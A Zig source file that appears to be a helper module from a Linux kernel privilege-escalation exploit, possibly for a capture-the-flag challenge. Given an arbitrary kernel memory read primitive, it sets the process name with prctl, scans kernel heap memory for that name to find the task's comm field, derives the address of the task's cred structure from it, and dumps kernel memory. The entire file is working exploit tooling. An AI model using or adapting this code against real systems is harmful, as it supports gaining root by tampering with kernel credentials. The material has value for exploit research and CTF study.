const std = @import("std");
const lnx = @import("linux.zig");

fn fn_type(comptime F: type) type {
    return switch (@typeInfo(F)) {
        .Fn => F,
        .Pointer => |p| switch (@typeInfo(p.child)) {
            .Fn => p.child,
            else => @compileError("expected fn or *const fn"),
        },
        else => @compileError("expected fn or *const fn"),
    };
}

fn reader_word_type(comptime Reader: type) type {
    const info = @typeInfo(fn_type(Reader)).Fn;

    if (info.params.len != 1) {
        @compileError("reader must be fn(usize) u32|u64");
    }

    const addr_t = info.params[0].type orelse @compileError("reader param0 must have type");
    const word_t = info.return_type orelse @compileError("reader must have return type");

    if (addr_t != usize) {
        @compileError("reader param0 must be usize address");
    }

    if (word_t != u32 and word_t != u64) {
        @compileError("reader return type must be u32 or u64");
    }

    return word_t;
}

fn found_target(addr: usize, target: []const u8, reader: anytype) bool {
    const word_t = reader_word_type(@TypeOf(reader));
    const word_size: usize = @sizeOf(word_t);
    const chunk_t = [word_size]u8;

    var offset: usize = 0;
    while (offset < target.len) : (offset += word_size) {
        var actual: word_t = reader(addr + offset);

        var chunk: chunk_t = std.mem.zeroes(chunk_t);
        const part = target[offset..@min(offset + word_size, target.len)];
        @memcpy(chunk[0..part.len], part);
        var expected: word_t = std.mem.readInt(word_t, &chunk, .little);

        if (part.len < word_size) {
            const shift_amt: std.math.Log2Int(word_t) = @intCast(part.len * 8);
            const mask: word_t = (@as(word_t, 1) << shift_amt) - 1;
            actual &= mask;
            expected &= mask;
        }

        if (actual != expected) {
            return false;
        }
    }

    return true;
}

pub fn find_target_from_heap(addr_start: usize, target: []const u8, reader: anytype) ?usize {
    var addr = addr_start;
    while (true) : (addr += 8) {
        if ((addr & 0xffff) == 0) {
            std.debug.print("      searching 0x{x}...\n", .{addr});
        }

        if (found_target(addr, target, reader)) {
            std.debug.print("[+] found target at 0x{x}\n", .{addr});
            return addr;
        }
    }

    return null;
}

pub fn find_comm(addr_start: usize, reader: anytype) ?usize {
    // Set current->comm (task name) so we can search it in kernel memory.
    var name_buf: [16]u8 = std.mem.zeroes([16]u8);
    const name = "maimai";
    @memcpy(name_buf[0..name.len], name);
    _ = lnx.check(lnx.os.prctl(lnx.pr_set_name, @intFromPtr(name_buf[0..].ptr), 0, 0, 0), "prctl(PR_SET_NAME)");

    const target = "maimai\x00";
    std.debug.print("[ ] start searching comm from 0x{x}\n", .{addr_start});
    return find_target_from_heap(addr_start, target, reader);
}

pub fn comm_to_addr_cred(addr_comm: usize, reader: anytype) ?usize {
    std.debug.print("[ ] locating current->cred from current->comm\n", .{});

    const word_t = reader_word_type(@TypeOf(reader));

    var addr_cred: u64 = 0;
    if (comptime word_t == u32) {
        addr_cred |= reader(addr_comm - 8);
        addr_cred |= @as(u64, reader(addr_comm - 4)) << 32;
    } else if (comptime word_t == u64) {
        addr_cred = reader(addr_comm - 8);
    } else {
        @compileError("unreachable: word_t must be u32 or u64");
    }

    std.debug.print("[+] current->cred at 0x{x}\n", .{addr_cred});
    return addr_cred;
}

pub fn dump_buffer_aar(addr_start: usize, row: u64, reader: anytype) void {
    const word_t = reader_word_type(@TypeOf(reader));

    std.debug.print("[ ] buffer dump by aar from 0x{x}\n", .{addr_start});

    var i: u64 = 0;
    while (i < row) : (i += 1) {
        var val: u64 = 0;

        if (comptime word_t == u32) {
            val |= reader(addr_start + i * 8);
            val |= @as(u64, reader(addr_start + i * 8 + 4)) << 32;
        } else if (comptime word_t == u64) {
            val = reader(addr_start + i * 8);
        }

        std.debug.print("      0x{x}|+0x{x:0>3}: 0x{x:0>16}\n", .{ addr_start + i * 8, i * 8, val });
    }
}
